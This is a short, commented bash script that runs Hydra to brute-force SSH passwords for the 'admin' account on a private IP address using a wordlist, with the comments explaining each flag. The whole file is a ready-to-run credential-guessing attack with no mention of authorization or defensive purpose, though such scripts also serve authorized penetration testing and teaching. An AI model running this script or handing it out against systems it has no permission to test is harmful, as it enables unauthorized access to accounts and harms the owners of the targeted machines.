#!/bin/bash

# Line 1: Define the target IP or domain
TARGET="192.168.0.101"

# Line 2: Define the username you want to brute-force
USERNAME="admin"

# Line 3: Define the path to your wordlist
WORDLIST="wordlist.txt"

# Line 4: Run the Hydra SSH brute-force attack
# Explanation:
# -l specifies the login name
# -P points to the password list
# ssh is the service
# $TARGET is the IP address or domain
# -t 4 means 4 parallel tasks
# -V enables verbose output
# -o saves the output to a file
hydra -l "$USERNAME" -P "$WORDLIST" ssh://$TARGET -t 4 -V -o output.log
